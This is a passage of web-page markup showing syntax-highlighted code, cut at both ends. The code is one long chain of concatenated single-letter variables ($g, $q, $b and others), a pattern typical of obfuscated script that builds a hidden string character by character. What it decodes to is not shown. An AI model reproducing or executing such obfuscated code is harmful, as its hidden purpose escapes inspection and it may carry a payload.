class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span><span class="hljs-variable">$e</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span><span class="hljs-variable">$l</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$l</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span><span class="hljs-variable">$l</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$q</span><span class="hljs-variable">$z</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$e</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$i</span><span class="hljs-variable">$d</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span 